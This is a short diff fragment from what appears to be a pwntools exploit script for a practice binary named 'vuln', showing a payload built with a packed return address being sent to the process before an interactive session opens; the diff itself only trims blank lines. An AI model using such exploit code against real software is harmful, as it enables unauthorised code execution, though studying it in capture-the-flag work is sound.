@@ -9,5 +9,3 @@ payload += p64(0x0000000000400768)
 p = conn.process("./vuln")
 p.send(payload)
 p.interactive()
-
-
